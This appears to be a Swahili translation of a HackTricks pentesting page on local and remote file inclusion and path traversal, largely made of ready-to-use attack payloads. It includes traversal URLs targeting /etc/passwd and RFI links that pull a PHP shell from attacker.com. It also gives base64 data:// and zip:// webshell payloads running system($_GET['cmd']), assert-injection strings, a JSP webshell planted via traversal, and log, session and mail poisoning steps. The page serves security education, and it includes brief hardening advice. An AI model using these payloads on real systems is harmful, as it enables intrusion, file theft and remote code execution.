# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Faili inapakiwa kutoka kwenye server ya mbali (Bora: Unaweza kuandika msimbo na server itauitekeleza). In php hii ime **zimwa** kwa default (**allow_url_include**).\
**Local File Inclusion (LFI):** Server inapakia faili ya ndani.

Udhaifu hutokea wakati mtumiaji anaweza kudhibiti kwa namna fulani faili itakayopakiwa na server.

Funksioni za **PHP** zilizo hatarini: require, require_once, include, include_once

Zana ya kuvutia ya kutumia ku-exploit udhaifu huu: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Kwa kuchanganya orodha kadhaa za \*nix LFI na kuongeza njia zaidi, nimeunda hii:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Jaribu pia kubadilisha `/` kwa `\`\
Jaribu pia kuongeza `../../../../../`

Orodha inayotumia mbinu mbalimbali kupata faili /etc/password (kuangalia ikiwa udhaifu upo) inaweza kupatikana [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Muungano wa wordlists tofauti:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Jaribu pia kubadilisha `/` kwa `\`\
Jaribu pia kuondoa `C:/` na kuongeza `../../../../../`

Orodha inayotumia mbinu mbalimbali kupata faili /boot.ini (kuangalia ikiwa udhaifu upo) inaweza kupatikana [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Angalia orodha ya LFI ya linux.

## Msingi wa LFI na njia za kukwepa

Mifano yote ni kwa Local File Inclusion lakini inaweza kutumika pia kwa Remote File Inclusion (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### Mfululizo wa traversal uliokatwa bila rekursia
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass kuongezwa kwa viongezi mwishoni mwa string iliyotolewa (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Hii ime **tatuliwa tangu PHP 5.4**

### **Encoding**

Unaweza kutumia encoding zisizo za kawaida kama double URL encode (na nyingine):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Kutoka kwenye folda iliyopo

Huenda back-end inakagua njia ya folda:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Kuchunguza Saraka za Mfumo wa Faili kwenye Seva

Mfumo wa faili wa seva unaweza kuchunguzwa kwa njia ya kurudia ili kubaini saraka, si faili tu, kwa kutumia mbinu fulani. Mchakato huu unahusisha kubaini kina cha saraka na kujaribu kuwepo kwa folda maalum. Hapa chini ni njia ya kina ya kufanikisha hili:

1. **Tambua Kina cha Saraka:** Bainisha kina cha saraka unayotumia kwa kupata kwa mafanikio faili ya `/etc/passwd` (inayotumika ikiwa seva ni ya Linux). Mfano wa URL unaweza kuundwa kama ifuatavyo, ukionyesha kina cha tatu:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Chunguza Folda:** Ongeza jina la folda unayoshuku (mfano, `private`) kwenye URL, kisha rudi kwenye `/etc/passwd`. Ngazi ya ziada ya directory inahitaji kuongeza kina kwa moja:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Tafsiri Matokeo:** Majibu ya server yanaonyesha ikiwa saraka ipo:
- **Hitilafu / Hakuna Matokeo:** Saraka `private` huenda haipo katika eneo lililotajwa.
- **Maudhui ya `/etc/passwd`:** Uwepo wa saraka ya `private` unathibitishwa.
4. **Uchunguzi wa Rekursivu:** Saraka zilizogunduliwa zinaweza kuchunguzwa zaidi kwa kuangalia saraka ndogo au faili kwa kutumia mbinu ile ile au mbinu za kimila za Local File Inclusion (LFI).

Ili kuchunguza directories katika maeneo tofauti ya mfumo wa faili, rekebisha payload ipasavyo. Kwa mfano, ili kuangalia kama `/var/www/` ina saraka ya `private` (kwa kuzingatia kwamba saraka ya sasa iko katika kina cha 3), tumia:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation ni mbinu inayotumika kubadilisha njia za faili katika programu za wavuti. Mara nyingi hutumiwa kufikia faili zilizozuiliwa kwa kupita hatua za usalama ambazo zinaongeza herufi au alama mwishoni mwa njia za faili. Lengo ni kutengeneza njia ya faili ambayo, mara itakaporudishwa au kuharibiwa na hatua ya usalama, bado itaonyesha kwenye faili linalotakiwa.

Katika PHP, uwakilishi tofauti wa njia ya faili unaweza kutazamwa kuwa sawa kutokana na tabia ya mfumo wa faili. Kwa mfano:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, na `/etc/passwd/` zote huhesabiwa kama njia ile ile.
- Wakati herufi 6 za mwisho ni `passwd`, kuongeza `/` (kufanya kuwa `passwd/`) hakubadilishi faili linalolengwa.
- Vivyo hivyo, ikiwa `.php` imeambatanishwa na njia ya faili (kama `shellcode.php`), kuongeza `/.` mwishoni haitabadili faili inayofunguliwa.

Mifano iliyoonyeshwa inaonyesha jinsi ya kutumia path truncation kufikia `/etc/passwd`, lengo la kawaida kutokana na yaliyomo nyeti (taarifa za akaunti za watumiaji):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Katika matukio haya, idadi ya traversals zinazohitajika inaweza kuwa takriban 2027, lakini idadi hiyo inaweza kutofautiana kulingana na usanidi wa server.

- **Using Dot Segments and Additional Characters**: Mfululizo wa traversal (`../`) uliounganishwa na dot segments za ziada na characters unaweza kutumika kusogeza kwenye file system, kwa ufanisi kupuuza appended strings zinazoongezwa na server.
- **Determining the Required Number of Traversals**: Kupitia majaribio na makosa, mtu anaweza kupata idadi kamili ya mfululizo wa `../` zinazohitajika ili kufika kwenye root directory kisha hadi `/etc/passwd`, kuhakikisha kuwa appended strings yoyote (kama `.php`) zimekatizwa lakini path inayotakiwa (`/etc/passwd`) bado iko sawa.
- **Starting with a Fake Directory**: Ni desturi ya kawaida kuanza path na directory isiyekuwepo (kama `a/`). This technique inatumika kama hatua ya tahadhari au kutimiza mahitaji ya server ya path parsing logic.

When employing path truncation techniques, it's crucial to understand the server's path parsing behavior and filesystem structure. Each scenario might require a different approach, and testing is often necessary to find the most effective method.

**This vulnerability was corrected in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

Katika php hii imezimwa kwa chaguo-msingi kwa sababu **`allow_url_include`** iko **Off.** Inatakiwa iwe **On** ili ifanye kazi, na katika hali hiyo unaweza kujumuisha faili la PHP kutoka kwenye seva yako na kupata RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Iwapo kwa sababu fulani **`allow_url_include`** iko **On**, lakini PHP **inachuja** ufikiaji wa kurasa za nje, [kulingana na chapisho hiki](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), unaweza kutumia kwa mfano data protocol na base64 ku-decode PHP code ya b64 na kupata RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> Katika code iliyotangulia, `+.txt` ya mwisho iliongezwa kwa sababu attacker alikuwa anahitaji mnyororo uliomalizika na `.txt`, hivyo mnyororo unamalizika nayo na baada ya b64 decode sehemu hiyo itarudisha tu taka na PHP code halisi itajumuishwa (na kwa hiyo, itatekelezwa).

Mfano mwingine **usiotumia `php://` protocol** ni:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Kipengele cha mzizi cha Python

Katika Python, katika msimbo kama huu:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Ikiwa mtumiaji atapitisha **njia kamili** kwa **`file_name`**, **njia iliyotangulia itaondolewa tu**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Hii ni tabia iliyokusudiwa kulingana na [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Ikiwa sehemu ni njia kamili (absolute path), vipengele vyote vya awali vinatupwa na kuunganishwa kunaendelea kutoka kwenye sehemu ya njia kamili.

## Java Orodha za direktori

Inaonekana kwamba ikiwa una Path Traversal katika Java na unaomba **direktori** badala ya faili, **orodha ya direktori itarudishwa**. Hii haitatokea katika lugha nyingine (afaik).

## Vigezo 25 Bora

Hapa kuna orodha ya vigezo 25 bora ambavyo vinaweza kuwa nyeti kwa local file inclusion (LFI) vulnerabilities (from [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI using PHP wrappers & protocols

### php://filter

PHP filters zinaruhusu kufanya operesheni za msingi za **mabadiliko ya data** kabla ya kusomwa au kuandikwa. Kuna makundi 5 ya filters:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Ondoa tags kutoka kwa data (kila kitu kati ya herufi "<" na ">" chars)
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Inabadilisha kwa encoding tofauti (`convert.iconv.<input_enc>.<output_enc>`). Ili kupata **orodha ya mifumo yote ya usimbaji** zinazoungwa mkono endesha kwenye console: `iconv -l`

> [!WARNING]
> Kwa kutumia vibaya filter ya `convert.iconv.*` unaweza **kuzalisha maandishi yoyote**, ambayo inaweza kuwa muhimu kuandika maandishi yoyote au kufanya function kama include kushughulikia maandishi yoyote. Kwa taarifa zaidi angalia [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Compress the content (useful if exfiltrating a lot of info)
- `zlib.inflate`: Decompress the data
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Imepitwa na wakati
- `mdecrypt.*` : Imepitwa na wakati
- Other Filters
- Ukirusha katika php `var_dump(stream_get_filters());` utaona couple ya **filters zisizotarajiwa**:
- `consumed`
- `dechunk`: reverses HTTP chunked encoding
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Sehemu "php://filter" haizingati tofauti kati ya herufi kubwa na ndogo

### Kutumia php filters kama oracle kusoma faili yoyote

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) imependekezwa mbinu ya kusoma faili ya ndani bila kupata output ikirudi kutoka kwa server. Mbinu hii inategemea boolean exfiltration ya faili (char kwa char) ikitumia php filters kama oracle. Hii ni kwa sababu php filters zinaweza kutumika kufanya text iwe kubwa vya kutosha ili kusababisha php itoke exception.

Katika postu ya asili utaona maelezo ya kina ya mbinu, lakini hapa ni muhtasari mfupi:

- Tumia codec **`UCS-4LE`** ili kuweka herufi ya mwanzo ya maandishi mwanzoni na kufanya ukubwa wa string kuongezeka kwa namna ya eksponential.
- Hii itatumika kuzalisha text kubwa kiasi kwamba wakati herufi ya mwanzo inakadiriwa kwa usahihi php itasababisha **error**
- Filter ya **dechunk** itaondoa kila kitu ikiwa char ya kwanza si hexadecimal, hivyo tunaweza kujua ikiwa char ya kwanza ni hex.
- Hii, ikichanganywa na ile ya awali (na filters nyingine kulingana na herufi inayokadiriwa), itatuwezesha kukisia herufi mwanzoni mwa text kwa kuona tunapofanya transformations za kutosha kufanya isiwe character ya hexadecimal. Kwa kuwa ikiwa ni hex, dechunk haitaiondoa na bomu la awali litasababisha php error.
- Codec **convert.iconv.UNICODE.CP930** hubadilisha kila herufi kuwa ile inayofuata (kwa hivyo baada ya codec hii: a -> b). Hii inaturuhusu kugundua ikiwa herufi ya kwanza ni `a` kwa mfano kwa kuwa ikiwa tunaweka codec hii mara 6 a->b->c->d->e->f->g herufi haitakuwa tena character ya hexadecimal, kwa hivyo dechunk haitaiondoa na php error itachocheka kwa sababu inazidisha na bomu la awali.
- Kutumia transformations nyingine kama **rot13** mwanzoni inawezekana leak chars wengine kama n, o, p, q, r (na codecs nyingine zinaweza kutumika kusogeza herufi nyingine kwa kiwango cha hex).
- Wakati char ya mwanzo ni nambari inahitajika ku-base64 encode na leak herufi 2 za kwanza ili leak nambari.
- Shida ya mwisho ni kuona **jinsi ya leak zaidi ya herufi ya mwanzo**. Kwa kutumia order memory filters kama **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** inawezekana kubadilisha mpangilio wa chars na kupata kwenye nafasi ya kwanza herufi nyingine za text.
- Na ili kuwezesha kupata **further data** wazo ni **kuzalisha 2 bytes za junk data mwanzoni** kwa **convert.iconv.UTF16.UTF16**, tumia **UCS-4LE** ili kufanya i-pivot na 2 bytes zinazofuata, na futa data hadi kufikia junk data (hii itaondoa 2 bytes za kwanza za text ya awali). Endelea kufanya hivi hadi ufikie kipande unachotaka leak.

Katika postu pia ilifunuliwa zana ya kutekeleza hii moja kwa moja: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Hii wrapper inaruhusu kupata access kwa file descriptors ambazo process imefungua. Inaweza kuwa muhimu ku-exfiltrate content ya opened files:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Unaweza pia kutumia **php://stdin, php://stdout and php://stderr** kufikia **file descriptors 0, 1 and 2** mtawalia (sijui jinsi hii ingeweza kuwa muhimu katika shambulio)

### zip:// and rar://

Pakia faili ya Zip au Rar yenye PHPShell ndani na uifikishe.\
Ili kuweza kutumia vibaya protokoli ya rar, lazima iwe **imewezeshwa mahsusi**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Kumbuka kwamba protokoli hii imezuiwa na mipangilio ya php **`allow_url_open`** na **`allow_url_include`**

### expect://

Expect inapaswa kuwezeshwa. Unaweza kutekeleza code ukitumia hivi:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Taja payload yako katika POST parameters:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Faili ya `.phar` inaweza kutumiwa kutekeleza msimbo wa PHP wakati programu ya wavuti inapotumia kazi kama `include` kwa ajili ya kupakia faili. Kipande cha msimbo cha PHP kilichoonyeshwa hapa chini kinaonyesha uundaji wa faili ya `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Ili kujenga faili ya `.phar`, amri ifuatayo inapaswa kutekelezwa:
```bash
php --define phar.readonly=0 create_path.php
```
Wakati wa utekelezaji, faili iitwayo `test.phar` itaundwa, ambayo inaweza kutumika kuwanufaisha udhaifu wa Local File Inclusion (LFI).

Katika kesi ambapo LFI inasoma tu faili bila kutekeleza PHP code iliyomo ndani, kupitia functions kama `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, au `filesize()`, inaweza kujaribu exploitation ya deserialization vulnerability. Udhaifu huu unahusishwa na kusoma faili kwa kutumia protocol ya `phar`.

Kwa ufafanuzi wa kina kuhusu kuwanufaisha deserialization vulnerabilities katika muktadha wa `.phar` files, rejea hati iliyounganishwa hapa chini:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Ilikuwa inawezekana kuabusu **any arbitrary file read from PHP that supports php filters** kupata RCE. Maelezo ya kina yanaweza [**kupatikana katika chapisho hili**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Muhtasari mfupi: **3 byte overflow** katika PHP heap ilitumiwa ku**badilisha chain ya free chunks** ya ukubwa maalum ili kuweza **kuandika chochote kwa anwani yoyote**, hivyo hook iliongezwa kuitwa **`system`**.\
Ilikuwa inawezekana ku-alloc chunks za ukubwa maalum kwa kuabusu php filters zaidi.

### Protokoli zaidi

Angalia [ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Andika katika memory au katika faili ya muda (sina uhakika jinsi hii inaweza kuwa muhimu katika attack ya file inclusion)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Kufikia filesystem ya ndani
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Kufikia HTTP(s) URLs
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Kufikia FTP(s) URLs
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Compression Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Kutafuta pathnames zinazolingana na pattern (Hairejeshi kitu kinachoweza kuchapishwa, kwa hivyo sio ya maana hapa)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streams (Haifai kusoma faili za aina yoyote)

## LFI kupitia 'assert' ya PHP

Local File Inclusion (LFI) inakuwa hatari sana katika PHP pale unaposhughulika na function ya 'assert', ambayo inaweza kutekeleza code ndani ya strings. Hii ni tatizo hasa ikiwa input yenye characters za directory traversal kama ".." inachunguzwa lakini haitakaswi ipasavyo.

Kwa mfano, PHP code inaweza kutengenezwa kuzuia directory traversal kama ifuatavyo:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Ingawa hili linakusudia kuzuia traversal, kwa bahati mbaya linaumba vector kwa code injection. To exploit this kwa kusoma yaliyomo kwenye faili, attacker angeweza kutumia:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Vivyo hivyo, kwa kutekeleza amri yoyote ya mfumo, mtu anaweza kutumia:
```plaintext
' and die(system("id")) or '
```
Ni muhimu **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Mbinu hii inatumika katika matukio ambapo unadhibiti **file path** ya **PHP function** ambayo itafanya **access a file** lakini hautaona yaliyomo ya file (kama simu rahisi ya **`file()`**) na yaliyomo hayataonyeshwa.

Katika [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) imeelezwa jinsi blind path traversal inaweza kutumiwa kupitia PHP filter ili **exfiltrate the content of a file via an error oracle**.

Kwa muhtasari, mbinu inatumia **"UCS-4LE" encoding** kufanya yaliyomo ya file kuwa kubwa sana kiasi kwamba **PHP function opening** file itasababisha **error**.

Halafu, ili leak the first char filter **`dechunk`** inatumika pamoja na zingine kama **base64** au **rot13**, na hatimaye filters **convert.iconv.UCS-4.UCS-4LE** na **convert.iconv.UTF16.UTF-16BE** zinatumika kuweka chars nyingine mwanzoni na leak them.

Functions zinazoweza kuwa hatarini: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Kwa maelezo ya kitaalamu angalia post iliyotajwa!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Wakati code ya server-side inayochukua/kuupload files inajenga destination path kwa kutumia data inayodhibitiwa na mtumiaji (mfano, jina la file au URL) bila canonicalising na validating, segments `..` na absolute paths zinaweza kutoroka kwenye directory iliyokusudiwa na kusababisha arbitrary file write. Ikiwa unaweza kuweka payload chini ya web-exposed directory, kawaida unapata unauthenticated RCE kwa ku-drop webshell.

Typical exploitation workflow:
- Tambua write primitive kwenye endpoint au background worker ambayo inakubali path/filename na inaandika content kwenye disk (k.m., message-driven ingestion, XML/JSON command handlers, ZIP extractors, n.k.).
- Tambua web-exposed directories. Mifano ya kawaida:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Tengeneza traversal path inayoondoka kwenye storage directory iliyokusudiwa kuelekea webroot, na jumuisha webshell content.
- Tembelea payload ulioweka na utekeleze amri.

Notes:
- The vulnerable service that performs the write may listen on a non-HTTP port (e.g., a JMF XML listener on TCP 4004). The main web portal (different port) will later serve your payload.
- On Java stacks, these file writes are often implemented with simple `File`/`Paths` concatenation. Lack of canonicalisation/allow-listing is the core flaw.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Uimarishaji unaozuia aina hii ya mende:
- Tafuta njia ya kanoni na uthibitishe kuwa ni tawi la saraka ya msingi iliyoorodheshwa kwa ruhusa.
- Kataa njia yoyote inayojumuisha `..`, mizizi ya absolute, au barua za drive; pendelea majina ya faili yaliyotengenezwa.
- Endesha writer kama akaunti yenye vibali vidogo na tengeneza utofauti kati ya saraka za kuandika na mizizi inayohudumiwa.

## Remote File Inclusion

Explained previously, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

Ikiwa server ya Apache au Nginx ni **vulnerable to LFI** ndani ya include function unaweza kujaribu kufikia **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, kuweka ndani ya **user agent** au ndani ya **GET parameter** php shell kama **`<?php system($_GET['c']); ?>`** na include hilo faili

> [!WARNING]
> Kumbuka kwamba **ikiwa utatumia nukuu mbili (double quotes)** kwa shell badala ya **nukuu moja (simple quotes)**, nukuu hizo mbili zitatangazwa kwa ajili ya string "_**quote;**_", **PHP itatoa kosa** hapo na **hakitaendesha chochote kingine**.
>
> Pia, hakikisha una **andika payload vizuri** au PHP itatoa kosa kila mara inapojaribu kupakia log file na hautapata fursa ya pili.

Hii pia inaweza kufanywa katika log nyingine lakini **kuwa mwangalifu,** code iliyomo katika logs inaweza kuwa URL encoded na hii inaweza kuharibu Shell. Header **authorisation "basic"** ina "user:password" kwenye Base64 na inachukuliwa (decoded) ndani ya logs. PHPShell inaweza kuingizwa ndani ya header hii.\
Other possible log paths:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Kupitia Barua pepe

**Tuma barua pepe** kwa akaunti ya ndani (user@localhost) ikiwa na PHP payload yako kama `<?php echo system($_REQUEST["cmd"]); ?>` na jaribu ku-include barua pepe ya mtumiaji kwa path kama **`/var/mail/<USERNAME>`** au **`/var/spool/mail/<USERNAME>`**

### Kupitia /proc/*/fd/*

1. Pakia shells nyingi (kwa mfano: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), ambapo $PID = PID ya mchakato (can be brute forced) na $FD ni file descriptor (can be brute forced too)

### Kupitia /proc/self/environ

Kama faili ya log, tuma payload katika User-Agent, itaonekana ndani ya faili /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Kupakia

Ikiwa unaweza kupakia faili, ingiza tu shell payload ndani yake (kwa mfano: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Ili faili iwe rahisi kusoma ni bora ku-inject ndani ya metadata ya picha/doc/pdf

### Kupitia upakuaji wa ZIP

Pakia faili la ZIP linalojumuisha PHP shell iliyoshinikizwa na ufikie:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Kupitia PHP sessions

Angalia kama tovuti inatumia PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
Katika PHP, sessions hizi zinahifadhiwa katika _/var/lib/php5/sess\\_\[PHPSESSID]\_ mafaili.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Weka cookie kuwa `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Tumia LFI kujumuisha faili ya session ya PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Kupitia ssh

Kama ssh iko hai angalia ni mtumiaji gani anatumika (/proc/self/status & /etc/passwd) na jaribu kufikia **\<HOME>/.ssh/id_rsa**

### **Kupitia** **vsftpd** _**logs**_

Logs za server ya FTP vsftpd ziko katika _**/var/log/vsftpd.log**_. Katika senario ambapo kuna Local File Inclusion (LFI) vulnerability, na ikiwa inawezekana kupata server ya vsftpd iliyofichuliwa, hatua zifuatazo zinaweza kuzingatiwa:

1. Ingiza payload ya PHP kwenye uwanja wa username wakati wa mchakato wa kuingia.
